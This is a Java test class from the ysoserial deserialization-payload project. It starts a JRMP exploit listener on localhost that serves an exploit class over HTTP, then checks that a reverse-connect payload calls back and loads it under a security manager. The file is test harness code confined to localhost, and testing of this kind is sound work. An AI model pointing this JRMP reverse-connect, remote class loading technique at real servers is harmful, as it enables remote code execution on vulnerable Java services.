package ysoserial.test.payloads;


import java.net.URL;
import java.util.concurrent.Callable;

import ysoserial.test.WrappedTest;
import ysoserial.exploit.JRMPListener;


/**
 * @author mbechler
 *
 */
public class JRMPReverseConnectSMTest extends RemoteClassLoadingTest implements WrappedTest {

    private int jrmpPort;


    public JRMPReverseConnectSMTest (String command) {
        super(command);
        // some payloads cannot specify the port
        jrmpPort = 1099;
    }





    /**
      * {@inheritDoc}
      *
      * @see RemoteClassLoadingTest#createCallable(java.util.concurrent.Callable)
      */
    @Override
    public Callable<Object> createCallable ( final Callable<Object> innerCallable ) {
        return  super.createCallable(new Callable<Object>() {
            public Object call () throws Exception {
                JRMPListener l = new JRMPListener(jrmpPort, getExploitClassName(), new URL("http", "localhost", getHTTPPort(), "/"));
                Thread t = new Thread(l, "JRMP listener");
                try {
                    t.start();
                    Object res = innerCallable.call();
                    l.waitFor(1000);
                    return res;
                }
                finally {
                    l.close();
                    t.interrupt();
                    t.join();
                }
            }
        });
    }

    @Override
    public String getPayloadArgs () {
        return "localhost:" + jrmpPort;
    }




}
